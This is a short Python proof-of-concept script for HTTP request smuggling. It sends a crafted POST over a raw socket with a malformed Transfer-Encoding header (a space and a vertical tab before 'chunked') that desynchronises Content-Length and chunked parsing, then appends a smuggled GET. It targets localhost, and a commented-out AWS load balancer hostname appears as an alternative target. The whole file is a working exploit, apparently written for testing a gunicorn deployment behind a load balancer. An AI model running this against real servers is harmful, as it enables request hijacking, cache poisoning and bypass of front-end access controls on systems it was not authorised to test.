import socket
# host = 'gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com'
host = 'localhost'
port = 80
smuggle = f"""GET / HTTP/1.1
Host: localhost
Request: smuggled

""".replace('\n','\r\n')
body = f"""0

POST / HTTP/1.1
Host: {host}
Content-Length: {len(smuggle)+4}
Request: 2
Connection: keep-alive

Comm""".replace('\n','\r\n')

header = f"""POST / HTTP/1.1
Host: {host}
Content-Length: {len(body)-4}
Request: 1
Transfer-Encoding :\\x0bchunked

""".replace('\n', '\r\n')

print("Sending request...")
print("_"*50)
print(header + body)
print("_"*50)
request = (header + body).encode()
print(request)
print("_"*50)
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    s.sendall(request)
    s.sendall(smuggle.encode())
    responce = s.recv(4096)
    print(responce.decode())
